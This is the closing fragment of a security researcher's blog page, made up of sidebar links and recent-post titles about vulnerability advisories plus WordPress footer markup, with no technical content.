SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3 current-cat"><a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="https://charlieeriksen.github.io/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:46:07 by W3 Total Cache -->